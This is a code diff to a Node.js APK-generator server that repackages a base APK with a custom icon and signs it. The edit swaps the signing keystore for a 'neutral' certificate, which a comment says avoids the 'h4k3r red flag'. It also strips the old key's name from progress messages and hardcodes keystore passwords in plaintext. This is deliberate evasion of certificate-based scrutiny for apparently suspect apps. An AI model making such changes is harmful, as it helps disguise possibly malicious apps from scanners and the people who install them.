@@ -23,7 +23,8 @@ const ASSETS_DIR = path.join(__dirname, 'assets');
 const TEMP_DIR   = path.join(__dirname, 'temp');
 const BASE_APK     = path.join(ASSETS_DIR, 'base.apk');
 const DEFAULT_ICON = path.join(ASSETS_DIR, 'default_icon.png');
-const KEYSTORE     = path.join(ASSETS_DIR, 'usman90.jks');
+const KEYSTORE     = path.join(ASSETS_DIR, 'neutral.jks');   // OU=Software — neutral cert, no h4k3r red flag
+const KEYSTORE_ALT = path.join(ASSETS_DIR, 'usman90.jks');   // fallback legacy
 const SIGNER       = path.join(ASSETS_DIR, 'uber-apk-signer.jar');
 
 if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });
@@ -508,10 +509,14 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             zip.writeZip(unsignedPath);
 
-            await sendUpdate('apk_progress', { step: 'Signing package with usman90 key...', progress: 85 });
-            const ksArgs = fs.existsSync(KEYSTORE)
-                ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
-                : '';
+            await sendUpdate('apk_progress', { step: 'Signing package...', progress: 85 });
+            // Prefer neutral.jks (clean cert DN) — falls back to usman90.jks legacy
+            const activeKs = fs.existsSync(KEYSTORE) ? KEYSTORE : (fs.existsSync(KEYSTORE_ALT) ? KEYSTORE_ALT : null);
+            const ksArgs = activeKs === KEYSTORE
+                ? `--ks "${KEYSTORE}" --ksAlias appkey --ksPass "Secure@2024!" --ksKeyPass "Secure@2024!"`
+                : activeKs === KEYSTORE_ALT
+                    ? `--ks "${KEYSTORE_ALT}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
+                    : '';
             const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" ${ksArgs} --allowResign`;
 
             await new Promise((resolve, reject) => {
